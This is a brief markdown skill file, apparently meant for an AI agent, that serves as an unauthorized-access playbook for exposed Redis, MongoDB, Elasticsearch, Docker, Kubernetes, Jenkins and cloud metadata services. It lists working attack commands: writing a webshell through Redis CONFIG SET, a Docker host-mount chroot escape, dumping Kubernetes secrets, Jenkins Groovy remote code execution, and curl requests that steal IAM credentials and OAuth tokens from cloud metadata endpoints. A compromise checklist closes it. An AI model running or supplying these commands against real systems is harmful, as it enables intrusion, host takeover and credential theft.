---
name: unauthorized-access-common-services
description: >-
  Common service exposure playbook for Redis, MongoDB, Elasticsearch, Docker, Kubernetes, Jenkins, etc.
---

# SKILL: Unauthorized Access - Common Services

## 1. DATABASES

### Redis (6379)
- redis-cli -h 10.0.0.1
- CONFIG SET dir /var/www/html
- CONFIG SET dbfilename shell.php
- Write webshell via BGSAVE

### MongoDB (27017)
- mongo --host 10.0.0.1
- show dbs; use admin; db.system.users.find()

### Elasticsearch (9200)
- curl http://10.0.0.1:9200/_cat/indices
- curl http://10.0.0.1:9200/_search?pretty

## 2. ORCHESTRATION

### Docker (2375 unsecured)
- docker -H tcp://10.0.0.1:2375 run -v /:/mnt -it alpine chroot /mnt sh

### Kubernetes (6443)
- kubectl --server=https://10.0.0.1:6443 --insecure-skip-tls-verify get secrets

### Jenkins (8080)
- /script endpoint: Groovy script console RCE
`groovy
def cmd = "id".execute(); println cmd.text
`

## 3. CLOUD METADATA

### AWS
- curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

### GCP
- curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/

### Azure
- curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

## 4. VALIDATION CHECKLIST
- [ ] Redis accessed (no auth)
- [ ] MongoDB accessible
- [ ] Elasticsearch queried
- [ ] Docker daemon reachable
- [ ] Jenkins script console
- [ ] Cloud metadata endpoints
